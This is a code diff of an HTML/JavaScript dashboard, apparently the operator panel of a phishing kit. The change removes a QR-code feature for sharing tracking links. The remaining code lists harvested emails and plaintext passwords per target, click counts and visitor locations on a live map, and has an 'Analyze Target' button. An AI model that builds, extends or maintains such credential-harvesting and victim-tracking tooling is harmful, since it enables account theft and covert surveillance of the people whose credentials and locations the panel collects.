@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v9.0 (Polished) ::</title>
+    <title>:: HACKER-UI DASHBOARD v9.3 (QR Removed) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <script src="https://cdn.sheetjs.com/xlsx-latest/package/dist/xlsx.full.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -116,31 +115,19 @@
                 <div id="realtime-map" class="map-container"></div>
             </div>
         </div>
-
     </div>
     
     <div id="map-modal" class="modal">
         <div class="modal-content">
-            <span class="close-btn">&times;</span>
+            <span class="close-btn">×</span>
             <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
             <div id="map" class="map-container"></div>
             <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
         </div>
     </div>
-    <div id="qr-code-modal" class="modal">
-        <div class="modal-content" style="max-width: 350px; text-align: center;">
-            <span class="close-btn" id="qr-close-btn">&times;</span>
-            <h2 class="main-title" style="font-size: 24px;">QR Code</h2>
-            <div id="qr-code-container"></div>
-            <a id="qr-download-link" href="#" download="qrcode.png" class="hacker-button">[ DOWNLOAD QR CODE ]</a>
-        </div>
-    </div>
     
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // PASTE SEMUA KODE JAVASCRIPT LAMA ANDA DI SINI
-        // Logika JavaScript tidak perlu diubah, semua perbaikan ada di CSS.
-        // Kode JS dari jawaban sebelumnya akan bekerja sempurna dengan HTML & CSS baru ini.
         const authToken = localStorage.getItem('authToken');
         const authHeaders = { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` };
 
@@ -158,9 +145,9 @@
         const advancedToggle = document.getElementById('advanced-toggle'), advancedOptions = document.getElementById('advanced-options');
         const notificationSound = document.getElementById('notification-sound');
         const modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = modal.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions');
-        const qrModal = document.getElementById('qr-code-modal'), qrCloseBtn = document.getElementById('qr-close-btn'), qrContainer = document.getElementById('qr-code-container'), qrDownloadLink = document.getElementById('qr-download-link');
+        // [DIHAPUS] Variabel untuk QR Code tidak diperlukan lagi
         const exportExcelBtn = document.getElementById('export-excel-btn');
-        let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false, qrcode = null;
+        let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false;
         
         let currentCredentialCount = 0;
         let isInitialLoad = true;
@@ -203,10 +190,10 @@
         function initRealtimeMap() { if (!realtimeMap) { const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' }); realtimeMap = L.map('realtime-map', { center: [0, 0], zoom: 2, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(realtimeMap); realtimeMarkersLayer = L.featureGroup().addTo(realtimeMap); } }
         initRealtimeMap();
 
-        function showQrModal(url) { qrContainer.innerHTML = ''; qrModal.style.display = 'block'; qrcode = new QRCode(qrContainer, { text: url, width: 256, height: 256, colorDark : "#000000", colorLight : "#ffffff", correctLevel : QRCode.CorrectLevel.H }); setTimeout(() => { const canvas = qrContainer.querySelector('canvas'); if (canvas) { qrDownloadLink.href = canvas.toDataURL("image/png"); } }, 50); }
-        qrCloseBtn.onclick = () => { qrModal.style.display = "none"; };
+        // [DIHAPUS] Fungsi showQrModal() sudah tidak ada
+        
         closeBtn.onclick = () => { modal.style.display = "none" };
-        window.addEventListener('click', (event) => { if (event.target == qrModal) { qrModal.style.display = "none"; } if (event.target == modal) { modal.style.display = "none"; } });
+        window.addEventListener('click', (event) => { if (event.target == modal) { modal.style.display = "none"; } });
         
         advancedToggle.addEventListener('click', (e) => {
             e.preventDefault();
@@ -272,7 +259,7 @@
                     if (r.click_count > 0 && r.city) { 
                         mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')" title="View Map"><i class="fa-solid fa-map-location-dot"></i></button>`; 
                     }
-                    const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')" title="Show QR Code"><i class="fa-solid fa-qrcode"></i></button>`;
+                    // [DIHAPUS] const qrButton sudah tidak ada
                     const analyzeButton = `<button class="hacker-button small cyan" onclick="runIntelAnalysis('${r.username}')" title="Analyze Target"><i class="fa-solid fa-brain"></i></button>`;
                     const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')" title="Delete Link"><i class="fa-solid fa-trash-can"></i></button>`;
                     const locationText = r.city && r.country ? `${r.city}, ${r.country}` : 'N/A';
@@ -287,7 +274,7 @@
                         <td class="highlight-green">${r.click_count}</td>
                         <td class="highlight">${locationText}</td>
                         <td><span class="status-pill ${statusClass}">${statusText}</span></td>
-                        <td class="action-button-group">${mapButton} ${analyzeButton} ${qrButton} ${deleteButton}</td>
+                        <td class="action-button-group">${mapButton} ${analyzeButton} ${deleteButton}</td>
                     </tr>`;
                 });
                 html += "</tbody></table>";
@@ -335,7 +322,7 @@
                 const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
                 const statusClass = isExpired ? 'error' : 'active';
                 const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
-                const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')" title="Show QR Code"><i class="fa-solid fa-qrcode"></i></button>`;
+                // [DIHAPUS] const qrButton sudah tidak ada
                 const analyzeButton = `<button class="hacker-button small cyan" onclick="runIntelAnalysis('${r.username}')" title="Analyze Target"><i class="fa-solid fa-brain"></i></button>`;
                 const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')" title="Delete Link"><i class="fa-solid fa-trash-can"></i></button>`;
                 
@@ -350,14 +337,13 @@
                     <td class="highlight-red">${r.email}</td>
                     <td class="highlight-red">${r.password}</td>
                     <td><span class="status-pill ${statusClass}">${statusText}</span></td>
-                    <td class="action-button-group">${analyzeButton} ${qrButton} ${deleteButton}</td>
+                    <td class="action-button-group">${analyzeButton} ${deleteButton}</td>
                 </tr>`;
             });
             html += "</tbody></table>";
             mergedCredentialsSection.innerHTML = html;
         }
         
-        // Sisa kode JavaScript Anda tetap sama...
         function updateStats(e) { totalLinksEl.textContent = e.total_links || 0, totalClicksEl.textContent = e.total_clicks || 0, totalLocationsEl.textContent = e.total_locations || 0 }
         function updateTopLinksChart(e = []) { const o = document.getElementById('topLinksChart').getContext('2d'), t = [...e].sort((e, o) => o.click_count - e.click_count).slice(0, 5), a = t.map(e => e.id), n = t.map(e => e.click_count); topLinksChart ? (topLinksChart.data.labels = a, topLinksChart.data.datasets[0].data = n, topLinksChart.update()) : topLinksChart = new Chart(o, { type: 'bar', data: { labels: a, datasets: [{ label: 'Total Clicks', data: n, backgroundColor: 'rgba(0,255,65,0.5)', borderColor: '#00ff41', borderWidth: 1 }] }, options: { indexAxis: 'y', scales: { x: { ticks: { color: 'var(--text-primary)' }, grid: { color: 'rgba(0,255,65,0.1)' } }, y: { ticks: { color: 'var(--text-primary)', font: { size: 10 } }, grid: { color: 'rgba(0,255,65,0.1)' } } }, plugins: { legend: { display: !1 } } } }) }
         function updateBrowserChart(e = {}) { const o = document.getElementById('browserChart').getContext('2d'), t = Object.keys(e), a = Object.values(e); browserChart ? (browserChart.data.labels = t, browserChart.data.datasets[0].data = a, browserChart.update()) : browserChart = new Chart(o, { type: 'pie', data: { labels: t, datasets: [{ data: a, backgroundColor: ['#00ff41', '#ff00ff', '#00ffff', '#ffaa00', '#888888'], borderColor: 'var(--bg-dark)', borderWidth: 2 }] }, options: { plugins: { legend: { position: 'bottom', labels: { color: 'var(--text-primary)', boxWidth: 15, padding: 15 } } } } }) }
